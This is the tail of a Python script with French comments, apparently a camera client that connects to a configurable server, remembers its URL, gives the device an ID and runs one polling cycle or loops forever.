    parser.add_argument("--server", help="URL du serveur (ex. https://mon-serveur.onrender.com)")
    parser.add_argument("--save", action="store_true", help="mémorise --server pour les prochains lancements")
    parser.add_argument("--debug", action="store_true", help="affiche les logs détaillés (commandes reçues, etc.)")
    parser.add_argument("--once", action="store_true", help="un seul cycle de test, puis quitte")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    server_url = resolve_server_url(args.server)
    if args.save:
        if not args.server:
            logger.error("--save nécessite --server")
            return
        save_config(server_url)

    device_id = get_or_create_device_id()
    device_name = socket.gethostname()

    client = CameraClient(server_url, device_id, device_name)
    if args.once:
        client.run_once()
    else:
        client.run_forever()


if __name__ == "__main__":
    main()